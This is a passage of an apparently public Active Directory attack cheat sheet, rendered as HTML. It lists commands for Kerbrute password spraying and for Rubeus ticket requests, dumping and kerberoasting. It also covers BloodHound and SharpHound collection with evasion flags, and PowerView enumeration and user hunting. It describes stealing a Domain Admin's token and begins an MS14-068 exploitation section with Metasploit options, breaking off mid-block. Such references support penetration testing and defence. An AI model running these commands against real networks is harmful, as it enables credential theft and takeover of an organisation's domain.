  </span><span class="n">pingcastle.exe</span><span class="w"> </span><span class="nt">--scanner</span><span class="w"> </span><span class="nx">scanner_name</span><span class="w"> </span><span class="nt">--server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
  </span><span class="n">available</span><span class="w"> </span><span class="nx">scanners</span><span class="w"> </span><span class="nx">are:aclcheck</span><span class="p">,</span><span class="nx">antivirus</span><span class="p">,</span><span class="nx">corruptADDatabase</span><span class="p">,</span><span class="nx">foreignusers</span><span class="p">,</span><span class="nx">laps_bitlocker</span><span class="p">,</span><span class="nx">localadmin</span><span class="p">,</span><span class="nx">ullsession</span><span class="p">,</span><span class="nx">nullsession-trust</span><span class="p">,</span><span class="nx">share</span><span class="p">,</span><span class="nx">smb</span><span class="p">,</span><span class="nx">spooler</span><span class="p">,</span><span class="nx">startup</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="o">.</span><span class="n">/kerbrute</span><span class="w"> </span><span class="nx">passwordspray</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DOMAIN</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">USERS.TXT</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PASSWORD</span><span class="err">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:USER</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">/password:PASSWORD</span><span class="w"> </span><span class="p">[</span><span class="n">/enctype:DES</span><span class="o">|</span><span class="n">RC4</span><span class="o">|</span><span class="n">AES128</span><span class="o">|</span><span class="n">AES256</span><span class="p">]</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">/des:HASH</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">/rc4:HASH</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">/aes128:HASH</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">/aes256:HASH</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">/domain:DOMAIN</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/dc:DOMAIN_CONTROLLER</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/ptt</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/luid</span><span class="p">]</span><span class="w">
  </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="n">dump</span><span class="w"> </span><span class="p">[</span><span class="n">/service:SERVICE</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/luid:LOGINID</span><span class="p">]</span><span class="w">
  </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="n">klist</span><span class="w"> </span><span class="p">[</span><span class="n">/luid:LOGINID</span><span class="p">]</span><span class="w">
  </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="n">kerberoast</span><span class="w"> </span><span class="p">[</span><span class="n">/spn:</span><span class="s2">"blah/blah"</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/user:USER</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/domain:DOMAIN</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/dc:DOMAIN_CONTROLLER</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">/ou:</span><span class="s2">"OU=,..."</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/AutomatedLab/AutomatedLab">AutomatedLab</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">New-LabDefinition</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">GettingStarted</span><span class="w"> </span><span class="nt">-DefaultVirtualizationEngine</span><span class="w"> </span><span class="nx">HyperV</span><span class="w">
  </span><span class="n">Add-LabMachineDefinition</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">FirstServer</span><span class="w"> </span><span class="nt">-OperatingSystem</span><span class="w"> </span><span class="s1">'Windows Server 2016 SERVERSTANDARD'</span><span class="w">
  </span><span class="n">Install-Lab</span><span class="w">
  </span><span class="nx">Show-LabDeploymentSummary</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="active-directory-recon">Active Directory Recon</h2>

<h3 id="using-bloodhound">Using BloodHound</h3>

<p>Use the correct collector</p>
<ul>
  <li>AzureHound for Azure Active Directory</li>
  <li>SharpHound for local Active Directory</li>
</ul>

<p>use <a href="https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350">AzureHound</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c"># require: Install-Module -name Az -AllowClobber</span><span class="w">
</span><span class="c"># require: Install-Module -name AzureADPreview -AllowClobber</span><span class="w">
</span><span class="n">Connect-AzureAD</span><span class="w">
</span><span class="nx">Connect-AzAccount</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\AzureHound.ps1</span><span class="w">
</span><span class="nx">Invoke-AzureHound</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>use <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c"># run the collector on the machine using SharpHound.exe</span><span class="w">
</span><span class="c"># https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe</span><span class="w">
</span><span class="c"># /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">active.htb</span><span class="w"> </span><span class="nt">-SearchForest</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">--EncryptZip</span><span class="w"> </span><span class="nt">--ZipFilename</span><span class="w"> </span><span class="nx">export.zip</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="p">,</span><span class="nx">GPOLocalGroup</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nt">--LdapUsername</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UserName</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--LdapPassword</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Password</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--JSONFolder</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PathToFile</span><span class="err">&gt;</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">active.htb</span><span class="w"> </span><span class="nt">--LdapUsername</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UserName</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--LdapPassword</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Password</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--domaincontroller</span><span class="w"> </span><span class="nx">10.10.10.100</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="p">,</span><span class="nx">GPOLocalGroup</span><span class="w"> </span><span class="nt">--outputdirectory</span><span class="w"> </span><span class="nx">C:\Windows\Temp</span><span class="w"> </span><span class="nt">--randomizefilenames</span><span class="w"> </span><span class="nt">--prettyjson</span><span class="w"> </span><span class="nt">--nosavecache</span><span class="w"> </span><span class="nt">--encryptzip</span><span class="w"> </span><span class="nt">--collectallproperties</span><span class="w"> </span><span class="nt">--throttle</span><span class="w"> </span><span class="nx">10000</span><span class="w"> </span><span class="nt">--jitter</span><span class="w"> </span><span class="nx">23</span><span class="w">

</span><span class="c"># or run the collector on the machine using Powershell</span><span class="w">
</span><span class="c"># https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</span><span class="w">
</span><span class="c"># /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1</span><span class="w">
</span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-SearchForest</span><span class="w"> </span><span class="nt">-CSVFolder</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w">
</span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w">  </span><span class="nt">-LDAPUser</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UserName</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-LDAPPass</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Password</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-OutputDirectory</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PathToFile</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># or remotely via BloodHound Python</span><span class="w">
</span><span class="c"># https://github.com/fox-it/BloodHound.py</span><span class="w">
</span><span class="n">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">bloodhound</span><span class="w">
</span><span class="n">bloodhound-python</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">lab.local</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">rsmith</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">Winter2017</span><span class="w"> </span><span class="nt">-gc</span><span class="w"> </span><span class="nx">LAB2008DC01.lab.local</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Then import the zip/json files into the Neo4J database and query them.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">apt</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">bloodhound</span><span class="w"> 

</span><span class="c"># start BloodHound and the database</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">neo4j</span><span class="w"> </span><span class="nx">console</span><span class="w">
</span><span class="c"># or use docker</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="nx">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">-p7474</span><span class="p">:</span><span class="nx">7474</span><span class="w"> </span><span class="nt">-p7687</span><span class="p">:</span><span class="nx">7687</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">NEO4J_AUTH</span><span class="o">=</span><span class="n">neo4j/bloodhound</span><span class="w"> </span><span class="nx">neo4j</span><span class="w">

</span><span class="n">root</span><span class="err">@</span><span class="nx">payload</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/bloodhound</span><span class="w"> </span><span class="nt">--no-sandbox</span><span class="w">
</span><span class="n">Go</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">http://127.0.0.1:7474</span><span class="p">,</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">db:bolt://localhost:7687</span><span class="p">,</span><span class="w"> </span><span class="nx">user:neo4J</span><span class="p">,</span><span class="w"> </span><span class="nx">pass:neo4j</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>You can add some custom queries like <a href="https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json">Bloodhound-Custom-Queries</a> from @hausec. Replace the customqueries.json file located at <code class="language-plaintext highlighter-rouge">/home/username/.config/bloodhound/customqueries.json</code> or <code class="language-plaintext highlighter-rouge">C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json</code>.</p>

<h3 id="using-powerview">Using PowerView</h3>

<ul>
  <li><strong>Get Current Domain:</strong> <code class="language-plaintext highlighter-rouge">Get-NetDomain</code></li>
  <li><strong>Enum Other Domains:</strong> <code class="language-plaintext highlighter-rouge">Get-NetDomain -Domain &lt;DomainName&gt;</code></li>
  <li><strong>Get Domain SID:</strong> <code class="language-plaintext highlighter-rouge">Get-DomainSID</code></li>
  <li><strong>Get Domain Policy:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Get Domain Controlers:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Get-NetDomainController
Get-NetDomainController -Domain &lt;DomainName&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enumerate Domain Users:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>Get-NetUser
Get-NetUser -SamAccountName &lt;user&gt; 
Get-NetUser | select cn
Get-UserProperty

#Check last password change
Get-UserProperty -Properties pwdlastset

#Get a spesific "string" on a user's attribute
Find-UserField -SearchField Description -SearchTerm "wtver"
  
#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName &lt;ComputerName&gt;
  
#Enumerate Session Information for a machine
Get-NetSession -ComputerName &lt;ComputerName&gt;
  
#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Domain Computers:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>Get-NetComputer -FullData
Get-DomainGroup

#Enumerate Live machines 
Get-NetComputer -Ping
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Groups and Group Members:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>Get-NetGroupMember -GroupName "&lt;GroupName&gt;" -Domain &lt;DomainName&gt;
  
#Enumerate the members of a specified group of the domain
Get-DomainGroup -Identity &lt;GroupName&gt; | Select-Object -ExpandProperty Member
  
#Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enumerate Shares</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>#Enumerate Domain Shares
Find-DomainShare
  
#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Group Policies:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>Get-NetGPO

# Shows active Policy on specified machine
Get-NetGPO -ComputerName &lt;Name of the PC&gt;
Get-NetGPOGroup

#Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName &lt;ComputerName&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum OUs:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Get-NetOU -FullData 
Get-NetGPO -GPOname &lt;The GUID of the GPO&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum ACLs:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre># Returns the ACLs associated with the specified account
Get-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

#Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Domain Trust:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Get-NetDomainTrust
Get-NetDomainTrust -Domain &lt;DomainName&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Forest Trust:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>Get-NetForestDomain
Get-NetForestDomain Forest &lt;ForestName&gt;

#Domains of Forest Enumeration
Get-NetForestDomain
Get-NetForestDomain Forest &lt;ForestName&gt;

#Map the Trust of the Forest
Get-NetForestTrust
Get-NetDomainTrust -Forest &lt;ForestName&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>User Hunting:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth

#Confirming admin access:
Invoke-UserHunter -CheckAccess
</pre></td></tr></tbody></table></code></div>    </div>
    <p>:heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong> <br />
I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; <br />
Profit!</p>

    <p><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView 3.0 Tricks</a></p>
  </li>
</ul>

<h3 id="using-ad-module">Using AD Module</h3>

<ul>
  <li><strong>Get Current Domain:</strong> <code class="language-plaintext highlighter-rouge">Get-ADDomain</code></li>
  <li><strong>Enum Other Domains:</strong> <code class="language-plaintext highlighter-rouge">Get-ADDomain -Identity &lt;Domain&gt;</code></li>
  <li><strong>Get Domain SID:</strong> <code class="language-plaintext highlighter-rouge">Get-DomainSID</code></li>
  <li><strong>Get Domain Controlers:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Get-ADDomainController
Get-ADDomainController -Identity &lt;DomainName&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enumerate Domain Users:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *

#Get a spesific "string" on a user's attribute
Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Domain Computers:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * 
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Domain Trust:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Get-ADTrust -Filter *
Get-ADTrust -Identity &lt;DomainName&gt;
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Forest Trust:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>Get-ADForest
Get-ADForest -Identity &lt;ForestName&gt;

#Domains of Forest Enumeration
(Get-ADForest).Domains
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>Enum Local AppLocker Effective Policy:</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="most-common-paths-to-ad-compromise">Most common paths to AD compromise</h2>

<h3 id="ms14-068-microsoft-kerberos-checksum-validation-vulnerability">MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)</h3>

<p>This exploit require to know the user SID, you can use <code class="language-plaintext highlighter-rouge">rpcclient</code> to remotely get it or <code class="language-plaintext highlighter-rouge">wmi</code> if you have an access on the machine.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c"># remote</span><span class="w">
</span><span class="n">rpcclient</span><span class="w"> </span><span class="err">$&gt;</span><span class="w"> </span><span class="nx">lookupnames</span><span class="w"> </span><span class="nx">john.smith</span><span class="w">
</span><span class="n">john.smith</span><span class="w"> </span><span class="nx">S-1-5-21-2923581646-3335815371-2872905324-1107</span><span class="w"> </span><span class="p">(</span><span class="n">User:</span><span class="w"> </span><span class="nx">1</span><span class="p">)</span><span class="w">

</span><span class="c"># loc</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">useraccount</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">sid</span><span class="w">
</span><span class="n">Administrator</span><span class="w">  </span><span class="nx">S-1-5-21-3415849876-833628785-5197346142-500</span><span class="w">   
</span><span class="n">Guest</span><span class="w">          </span><span class="nx">S-1-5-21-3415849876-833628785-5197346142-501</span><span class="w">   
</span><span class="n">Administrator</span><span class="w">  </span><span class="nx">S-1-5-21-297520375-2634728305-5197346142-500</span><span class="w">   
</span><span class="n">Guest</span><span class="w">          </span><span class="nx">S-1-5-21-297520375-2634728305-5197346142-501</span><span class="w">   
</span><span class="n">krbtgt</span><span class="w">         </span><span class="nx">S-1-5-21-297520375-2634728305-5197346142-502</span><span class="w">   
</span><span class="n">lambda</span><span class="w">         </span><span class="nx">S-1-5-21-297520375-2634728305-5197346142-1110</span><span class="w"> 

</span><span class="c"># powerview</span><span class="w">
</span><span class="n">Convert-NameToSid</span><span class="w"> </span><span class="nx">high-sec-corp.localkrbtgt</span><span class="w">
</span><span class="n">S-1-5-21-2941561648-383941485-1389968811-502</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
</pre></td></tr></tbody></table></code></div></div>

<p>Generate a ticket with <code class="language-plaintext highlighter-rouge">metasploit</code> or <code class="language-plaintext highlighter-rouge">pykek</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="n">Metasploit:</span><span class="w"> </span><span class="nx">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><span class="w">
   </span><span class="n">Name</span><span class="w">      </span><span class="nx">Current</span><span class="w"> </span><span class="nx">Setting</span><span class="w">                                </span><span class="nx">Required</span><span class="w">  </span><span class="nx">Description</span><span class="w">
   </span><span class="o">----</span><span class="w">      </span><span class="o">---------------</span><span class="w">                                </span><span class="o">--------</span><span class="w">  </span><span class="o">-----------</span><span class="w">
   </span><span class="n">DOMAIN</span><span class="w">    </span><span class="nx">LABDOMAIN.LOCAL</span><span class="w">                                </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="p">(</span><span class="n">upper</span><span class="w"> </span><span class="nx">case</span><span class="p">)</span><span class="w"> </span><span class="n">Ex:</span><span class="w"> </span><span class="nx">DEMO.LOCAL</span><span class="w">
   </span><span class="n">PASSWORD</span><span class="w">  </span><span class="nx">P</span><span class="err">@</span><span class="nx">ssw0rd</span><span class="w">                                       </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nx">password</span><span class="w">
   </span><span class="n">RHOSTS</span><span class="w">    </span><span class="nx">10.10.10.10</span><span class="w">                                    </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">range</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">CIDR</span><span class="w"> </span><span class="nx">identifier</span><span class="w">
   </span><span class="n">RPORT</span><span class="w">     </span><span class="nx">88</span><span class="w">                                             </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">port</span><span class="w">
   </span><span class="n">Timeout</span><span class="w">   </span><span class="nx">10</span><span class="w">                                             </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">TCP</span><span class="w"> </span><span class="nx">timeout</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">establish</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">data</span><span class="w">
   </span><span class="n">USER</span><span class="w">      </span><span class="nx">lambda</span><span class="w">                                         </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">User</span><span class="w">
   </span><span class="n">USER_SID</span><span class="w">  </span><span class="nx">S-1-5-21-297520375-2634728305-5197346142-1106</span><span class="w">  </span><span class="nx">yes</span><span class="w">       </span><span class="nx">The</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nx">SID</span><span class="p">,</span><span class="w"> </span><span class="nx">Ex:</span><span class="w"> </span><span class="nx">S-1-5-21-1755879683-3641577184-3486455962-1000</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
